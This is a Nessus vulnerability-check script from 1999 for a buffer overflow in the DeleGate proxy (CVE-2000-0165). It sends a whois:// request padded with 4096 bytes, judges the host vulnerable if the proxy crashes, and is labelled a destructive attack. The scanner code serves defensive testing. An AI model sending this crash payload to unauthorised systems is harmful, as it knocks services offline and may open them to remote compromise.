#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10054);
 script_bugtraq_id(808);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-0165");
 name["english"] = "Delegate overflow";
 name["francais"] = "Dépassement de buffer dans DeleGate";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
The remote proxy is vulnerable to a buffer overflow
when it is issued the command :

	whois://a b 1 AAAA..AAAAA
	
This problem may allow an attacker to gain a shell
on this computer.

Solution : inform your vendor of this vulnerability and ask
	   for a patch or change your proxy
	   
Risk factor : High";

 desc["francais"] = "
Le proxy distant est vulnérable à un dépassement de buffer
lorsqu'il recoit la commande :

	whois://a b 1 AAAA...AAAA
	
Ce problème risque de permettre à un pirate d'obtenir
un shell sur ce système.

Solution : Informez votre vendeur et demandez un patch, ou
	   changez de proxy
	   
Facteur de risque : Elevé.";


 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "Determines if we can use overflow the remote web proxy"; 
 summary["francais"] = "Determine si nous pouvons faire un buffer overflow sur le proxy web distant";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "Gain root remotely"; 
 family["francais"] = "Passer root à distance";
 
 script_family(english:family["english"],
 	       francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/http_proxy", 8080);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/http_proxy");
if(!port) port = 8080;

if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  {
  #
  # Try a harmless request. If the connection is shut, it
  # means that the remote service does not accept to forward whois 
  # queries so we exit
  #
  
  command = string("whois://a b 1 aa\r\n\r\n");
  send(socket:soc, data:command);
  buffer = recv_line(socket:soc, length:4096);
  close(soc);
  if(!buffer)exit(0);
  
  soc2 = open_sock_tcp(port);
  if(soc2)
  {
   command = string("whois://a b 1 ", crap(4096), "\r\n\r\n");
   send(socket:soc2, data:command);
   buffer2 = recv_line(socket:soc2, length:4096);
   close(soc2);
   if(!buffer2)
   {
    soc2 = open_sock_tcp(port);
    if (!soc2)
      security_hole(port); 
   }
  }
 }
}

